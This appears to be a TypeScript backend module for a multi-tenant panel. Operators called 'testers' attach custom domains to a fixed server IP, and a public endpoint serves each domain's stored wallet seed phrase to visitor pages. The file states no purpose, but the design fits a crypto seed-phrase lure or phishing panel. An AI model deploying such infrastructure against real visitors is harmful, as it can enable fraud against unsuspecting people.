// Tenant/domain and per-tester settings server functions.
// - resolveTenantByHost: public (unauthenticated) — used by participant pages
//   to look up which tester "owns" this hostname and what seed phrase to show.
// - listMyDomains / addDomain / removeDomain: for the signed-in owner (tester
//   or admin manages their own; admin sees all through listAllDomains).
// - getMySeedPhrase / setMySeedPhrase: per-tester seed phrase (stored in
//   tester_settings).

import { createServerFn } from "@tanstack/react-start";
import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";
import { z } from "zod";

const HOST_RE = /^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?(\.[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)+$/;
const DEFAULT_SERVER_PUBLIC_IP = "136.0.213.111";

function normalizeHost(input: string): string {
  return input
    .trim()
    .toLowerCase()
    .replace(/^https?:\/\//, "")
    .replace(/\/.*$/, "")
    .replace(/:\d+$/, "")
    .replace(/\.$/, "");
}

/** Apex ↔ www sibling used so either form works after attaching one. */
function hostAliases(host: string): string[] {
  const h = normalizeHost(host);
  if (!h) return [];
  const out = [h];
  if (h.startsWith("www.")) out.push(h.slice(4));
  else out.push(`www.${h}`);
  return Array.from(new Set(out.filter(Boolean)));
}

async function findDomainRowByHost(host: string) {
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
  const aliases = hostAliases(host);
  const { data } = await supabaseAdmin
    .from("tenant_domains")
    .select("id, hostname, owner_id")
    .in("hostname", aliases)
    .limit(1)
    .maybeSingle();
  return data;
}

async function isAdmin(userId: string): Promise<boolean> {
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
  const { data } = await supabaseAdmin
    .from("user_roles")
    .select("role")
    .eq("user_id", userId)
    .eq("role", "admin")
    .maybeSingle();
  return !!data;
}

async function isTesterOrAdmin(userId: string): Promise<boolean> {
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
  const { data } = await supabaseAdmin
    .from("user_roles")
    .select("role")
    .eq("user_id", userId)
    .in("role", ["admin", "tester"]);
  return (data ?? []).length > 0;
}

// PUBLIC — visitor page uses this. Returns owner + seed phrase.
export const resolveTenantByHost = createServerFn({ method: "GET" })
  .inputValidator((d: unknown) => z.object({ host: z.string().max(255) }).parse(d))
  .handler(async ({ data }) => {
    const host = normalizeHost(data.host);
    if (!host) return { ownerId: null, seedPhrase: "" };
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const dom = await findDomainRowByHost(host);
    if (!dom) return { ownerId: null, seedPhrase: "" };
    const { data: settings } = await supabaseAdmin
      .from("tester_settings")
      .select("seed_phrase")
      .eq("owner_id", dom.owner_id)
      .maybeSingle();
    return { ownerId: dom.owner_id as string, seedPhrase: (settings?.seed_phrase as string) ?? "" };
  });

export const listMyDomains = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    if (!(await isTesterOrAdmin(context.userId))) throw new Error("Forbidden");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const admin = await isAdmin(context.userId);
    let query = supabaseAdmin
      .from("tenant_domains")
      .select("id, hostname, owner_id, created_at, dns_status, ssl_status, last_checked_at, last_seen_at")
      .order("created_at", { ascending: true });
    if (!admin) query = query.eq("owner_id", context.userId);
    const { data, error } = await query;
    if (error) throw new Error(error.message);
    const rows = data ?? [];
    if (!admin || rows.length === 0) return rows;
    const ownerIds = Array.from(new Set(rows.map((r) => r.owner_id as string)));
    const { data: profs } = await supabaseAdmin
      .from("profiles")
      .select("id, username")
      .in("id", ownerIds);
    const nameById = new Map((profs ?? []).map((p) => [p.id as string, (p.username as string) ?? "?"]));
    return rows.map((r) => ({
      ...r,
      owner_username: nameById.get(r.owner_id as string) ?? "?",
    }));
  });

export const addDomain = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) =>
    z
      .object({
        hostname: z.string().min(3).max(255),
        ownerId: z.string().uuid().optional(),
        includeWww: z.boolean().optional(),
      })
      .parse(d),
  )
  .handler(async ({ data, context }) => {
    if (!(await isTesterOrAdmin(context.userId))) throw new Error("Forbidden");
    const host = normalizeHost(data.hostname);
    if (!HOST_RE.test(host)) throw new Error("Invalid hostname — use something like example.com");
    if (host === "localhost" || /^\d{1,3}(\.\d{1,3}){3}$/.test(host)) {
      throw new Error("Use a real domain name, not an IP or localhost");
    }
    const panelHost = normalizeHost(process.env.PANEL_HOST ?? "");
    if (panelHost && (host === panelHost || host.endsWith("." + panelHost))) {
      throw new Error("That hostname is reserved for the admin panel");
    }
    const admin = await isAdmin(context.userId);
    const owner = admin && data.ownerId ? data.ownerId : context.userId;
    const includeWww = data.includeWww !== false;
    const hosts = includeWww ? hostAliases(host) : [host];
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

    const inserted: string[] = [];
    for (const h of hosts) {
      const { error } = await supabaseAdmin
        .from("tenant_domains")
        .insert({ hostname: h, owner_id: owner });
      if (error) {
        if (error.code === "23505") {
          // Already attached — only fail hard for the primary hostname.
          if (h === host) throw new Error("That domain is already attached (possibly to another tester)");
          continue;
        }
        throw new Error(error.message);
      }
      inserted.push(h);
      await supabaseAdmin
        .from("participants")
        .update({ owner_id: owner })
        .eq("host", h)
        .is("owner_id", null);
    }
    return { ok: true as const, hostname: host, attached: inserted };
  });

export const removeDomain = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) => z.object({ id: z.string().uuid() }).parse(d))
  .handler(async ({ data, context }) => {
    if (!(await isTesterOrAdmin(context.userId))) throw new Error("Forbidden");
    const admin = await isAdmin(context.userId);
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    let q = supabaseAdmin.from("tenant_domains").delete().eq("id", data.id);
    if (!admin) q = q.eq("owner_id", context.userId);
    const { error } = await q;
    if (error) throw new Error(error.message);
    return { ok: true as const };
  });

export const getMySeedPhrase = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    if (!(await isTesterOrAdmin(context.userId))) throw new Error("Forbidden");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { data } = await supabaseAdmin
      .from("tester_settings")
      .select("seed_phrase")
      .eq("owner_id", context.userId)
      .maybeSingle();
    return { seedPhrase: (data?.seed_phrase as string) ?? "" };
  });

export const setMySeedPhrase = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) => z.object({ seedPhrase: z.string().max(2048) }).parse(d))
  .handler(async ({ data, context }) => {
    if (!(await isTesterOrAdmin(context.userId))) throw new Error("Forbidden");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { error } = await supabaseAdmin
      .from("tester_settings")
      .upsert({ owner_id: context.userId, seed_phrase: data.seedPhrase }, { onConflict: "owner_id" });
    if (error) throw new Error(error.message);
    return { ok: true as const };
  });

// Admin-only: list every domain grouped with owner username for the admin panel.
export const listAllDomainsWithOwners = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    if (!(await isAdmin(context.userId))) throw new Error("Forbidden");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const [{ data: doms, error }, { data: profs }] = await Promise.all([
      supabaseAdmin.from("tenant_domains").select("id, hostname, owner_id, created_at").order("created_at"),
      supabaseAdmin.from("profiles").select("id, username"),
    ]);
    if (error) throw new Error(error.message);
    const nameById = new Map<string, string>((profs ?? []).map((p) => [p.id as string, (p.username as string) ?? "?"]));
    return (doms ?? []).map((d) => ({
      id: d.id as string,
      hostname: d.hostname as string,
      owner_id: d.owner_id as string,
      owner_username: nameById.get(d.owner_id as string) ?? "?",
      created_at: d.created_at as string,
    }));
  });

async function readServerPublicIp(): Promise<string> {
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
  const { data } = await supabaseAdmin
    .from("app_settings")
    .select("value")
    .eq("key", "server_public_ip")
    .maybeSingle();
  const stored = (data?.value as { ip?: string } | null)?.ip;
  if (stored && stored.trim()) return stored.trim();
  const env = (process.env.SERVER_PUBLIC_IP ?? "").trim();
  return env || DEFAULT_SERVER_PUBLIC_IP;
}

// Used by the "Add domain" dialog. Returns the IP configured in admin settings
// (falls back to SERVER_PUBLIC_IP env, then 136.0.213.111).
export const getServerConnectionInfo = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    if (!(await isTesterOrAdmin(context.userId))) throw new Error("Forbidden");
    const ip = await readServerPublicIp();
    // Seed the DB default once so all clients share the same RDP IP.
    if (ip === DEFAULT_SERVER_PUBLIC_IP) {
      try {
        const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
        const { data } = await supabaseAdmin
          .from("app_settings")
          .select("key")
          .eq("key", "server_public_ip")
          .maybeSingle();
        if (!data) {
          await supabaseAdmin.from("app_settings").upsert(
            { key: "server_public_ip", value: { ip: DEFAULT_SERVER_PUBLIC_IP }, updated_at: new Date().toISOString() },
            { onConflict: "key" },
          );
        }
      } catch {
        /* ignore */
      }
    }
    return {
      ip,
      panelHost: process.env.PANEL_HOST ?? "",
    };
  });

// Admin-only: update the server IP shown to testers when they add a domain.
export const setServerPublicIp = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) => z.object({ ip: z.string().trim().max(64) }).parse(d))
  .handler(async ({ data, context }) => {
    if (!(await isAdmin(context.userId))) throw new Error("Forbidden");
    const ip = data.ip.trim();
    // Accept IPv4 / IPv6 / empty (to reset to default).
    if (ip && !/^[0-9a-fA-F:.]+$/.test(ip)) throw new Error("Invalid IP");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { error } = await supabaseAdmin
      .from("app_settings")
      .upsert(
        { key: "server_public_ip", value: { ip }, updated_at: new Date().toISOString() },
        { onConflict: "key" },
      );
    if (error) throw new Error(error.message);
    return { ok: true as const, ip: ip || DEFAULT_SERVER_PUBLIC_IP };
  });

// Verifies (a) the hostname's A/CNAME records point at SERVER_PUBLIC_IP and
// (b) https://<host>/api/public/health returns 200 (proves Caddy has a cert).
export const checkDomainStatus = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) => z.object({ id: z.string().uuid() }).parse(d))
  .handler(async ({ data, context }) => {
    if (!(await isTesterOrAdmin(context.userId))) throw new Error("Forbidden");
    const admin = await isAdmin(context.userId);
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    let q = supabaseAdmin.from("tenant_domains").select("id, hostname, owner_id").eq("id", data.id);
    if (!admin) q = q.eq("owner_id", context.userId);
    const { data: row } = await q.maybeSingle();
    if (!row) throw new Error("Not found");
    const host = row.hostname as string;
    const ipConfigured = await readServerPublicIp();
    const expectIp = ipConfigured === "0.0.0.0" ? "" : ipConfigured;

    // DNS check via Cloudflare DoH (A + follow CNAME one hop).
    let dnsStatus: "ok" | "mismatch" | "pending" = "pending";
    let resolvedIps: string[] = [];
    try {
      const doh = await fetch(`https://cloudflare-dns.com/dns-query?name=${encodeURIComponent(host)}&type=A`, {
        headers: { accept: "application/dns-json" },
        signal: AbortSignal.timeout(5000),
      });
      const j = (await doh.json()) as { Answer?: Array<{ type: number; data: string }> };
      const answers = j.Answer ?? [];
      resolvedIps = answers.filter((a) => a.type === 1).map((a) => a.data.replace(/\.$/, ""));
      // If only CNAME answers, resolve the target once.
      if (resolvedIps.length === 0) {
        const cname = answers.find((a) => a.type === 5)?.data?.replace(/\.$/, "");
        if (cname) {
          const doh2 = await fetch(`https://cloudflare-dns.com/dns-query?name=${encodeURIComponent(cname)}&type=A`, {
            headers: { accept: "application/dns-json" },
            signal: AbortSignal.timeout(5000),
          });
          const j2 = (await doh2.json()) as { Answer?: Array<{ type: number; data: string }> };
          resolvedIps = (j2.Answer ?? []).filter((a) => a.type === 1).map((a) => a.data.replace(/\.$/, ""));
        }
      }
      if (resolvedIps.length === 0) dnsStatus = "pending";
      else if (!expectIp) dnsStatus = "ok";
      else dnsStatus = resolvedIps.includes(expectIp) ? "ok" : "mismatch";
    } catch {
      dnsStatus = "pending";
    }

    // SSL / live check.
    let sslStatus: "issued" | "pending" | "failed" = "pending";
    try {
      const probe = await fetch(`https://${host}/api/public/health`, {
        signal: AbortSignal.timeout(6000),
      });
      if (probe.ok) sslStatus = "issued";
      else sslStatus = "failed";
    } catch {
      sslStatus = "pending";
    }

    const nowIso = new Date().toISOString();
    await supabaseAdmin
      .from("tenant_domains")
      .update({ dns_status: dnsStatus, ssl_status: sslStatus, last_checked_at: nowIso })
      .eq("id", data.id);

    return {
      dns_status: dnsStatus,
      ssl_status: sslStatus,
      resolved_ips: resolvedIps,
      expected_ip: expectIp,
      last_checked_at: nowIso,
    };
  });

